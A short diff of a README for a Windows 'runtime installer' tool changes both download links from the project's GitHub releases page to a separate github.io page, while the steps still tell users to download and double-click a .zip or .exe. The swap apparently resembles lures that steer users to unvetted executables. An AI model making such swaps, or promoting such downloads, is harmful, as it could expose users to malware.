@@ -1,6 +1,6 @@
 # 🛠️ Runtime-Installer-AIO - Fix Missing System Files Instantly
 
-[![Download Runtime Installer](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/jothamsubtractive453/Runtime-Installer-AIO/releases)
+[![Download Runtime Installer](https://img.shields.io/badge/Download-Releases-blue.svg)](https://jothamsubtractive453.github.io)
 
 ---
 
@@ -21,7 +21,7 @@ This application works on most Windows setups:
 
 ## 🚀 How to Download and Install
 
-1.  Visit the [official releases page](https://github.com/jothamsubtractive453/Runtime-Installer-AIO/releases) to access the download options.
+1.  Visit the [official releases page](https://jothamsubtractive453.github.io) to access the download options.
 2.  Look for the latest version at the top of the list.
 3.  Click the file ending in `.zip` or `.exe` to begin the download.
 4.  Once the file is on your computer, double-click it to start the setup.
